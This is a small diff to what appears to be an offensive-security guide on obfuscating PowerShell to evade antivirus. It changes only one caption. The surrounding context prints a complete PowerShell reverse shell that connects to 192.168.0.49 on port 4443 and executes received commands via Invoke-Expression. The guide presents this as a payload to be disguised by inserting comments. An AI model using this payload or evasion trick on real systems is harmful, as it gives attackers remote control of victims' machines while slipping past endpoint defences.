@@ -94,7 +94,7 @@ ie""x'' "p`"`"w''d`"`""
 Obfuscating a script by appending comments here and there might actually do the trick on its own.  
 for example, a reverse shell command could be obfuscated like this:
 
-**Original** (Common r-shell command that is commonly detected)  
+**Original** (Common r-shell command that is easily detected by AVs)  
 ```$TCPClient = New-Object Net.Sockets.TCPClient('192.168.0.49', 4443);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()```
 
 **Modified** (appended <# SOME RANDOM COMMENT #> in various places)  
